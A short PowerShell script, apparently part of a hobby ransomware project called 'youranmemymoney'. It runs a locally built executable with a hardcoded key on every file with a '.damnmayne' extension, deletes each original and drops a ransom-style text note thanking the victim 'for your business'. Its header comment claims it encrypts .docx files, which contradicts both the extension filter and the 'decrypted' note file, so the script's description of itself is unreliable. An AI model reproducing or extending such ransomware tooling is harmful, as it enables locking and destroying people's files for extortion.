# INTENT: To encrypt all docx files in a directory.
foreach ($file in ((get-childitem | ? {$_.extension -eq ".damnmayne"}).fullname)){
    ..\..\..\..\..\youranmemymoney\youranmemymoney\bin\Debug\net8.0\youranmemymoney.exe $file 1234
    remove-item $file
}

echo "Thank you for your business. Stay clean." > YOURFILESAREDECRYPTED.TXT